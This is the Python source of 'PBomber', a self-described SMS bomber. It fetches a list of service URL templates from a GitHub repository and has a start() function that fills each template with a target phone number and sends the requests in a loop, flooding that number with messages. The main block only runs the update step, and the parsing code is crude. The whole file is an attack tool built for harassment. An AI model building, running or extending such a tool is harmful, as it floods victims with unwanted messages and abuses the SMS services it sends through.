import requests
import os
import sys

filename = "base.txt"

basefile = open(filename, "r+");

logo = """
=======      =====    ||\\     /||  =======    =======  ======= 
||     ||  ||     ||  || |   | ||  ||     ||  ||       ||     ||
||     ||  ||     ||  || |   | ||  ||     ||  ||       ||     ||
||=====    ||     ||  || |   | ||  ||=====    ||=====  ||===== 
||     ||  ||     ||  ||  \\ /  ||  ||     ||  ||       ||     ||
||     ||  ||     ||  ||   -   ||  ||     ||  ||       ||     ||
=======      =====    ||       ||  =======    =======  ||     ||
"""

about = "PBomber v1.0\nPBomber - SMS Bomber, written on Python. Created By IgorToxichnyy."

Base = {}

def checkInternet():
    #Checks internet connection
    requests.get("https://www.google.com/")

def InternetError():
    #Calls if excepted ConnectionError
    print("ERROR: Internet connection does not exists. Press enter to exit.")
    input()
    sys.exit()

def start(num):
    #Start spamming
    #TODO: MAKE DELAY
    i = 0
    while i < len(Base):
        requests.get(Base[i].format(num))
        print(Base[i].format(num))
        i += 1

def update():
    #Update services base
    url=list(str(requests.get("https://raw.githubusercontent.com/igortoxichnyy/PBomber/main/src/base.txt").content))

    del url[0]

    i = 0
    while i < len(url):
        if url[i] == "'":
            del url[i]
            i+=1
        elif url[i] == "\\":
            if url[i+1] == "r":
                del url[i]
                del url[i]
            elif url[i+1] == "n":
                del url[i]
                url[i] = "\n"
                i+=1
            elif url[i+1] == "\\":
                i+=2
        else:
            i+=1

    basefile.truncate()
    basefile.writelines(url)
    basefile.flush()

if __name__ == '__main__':
    update()
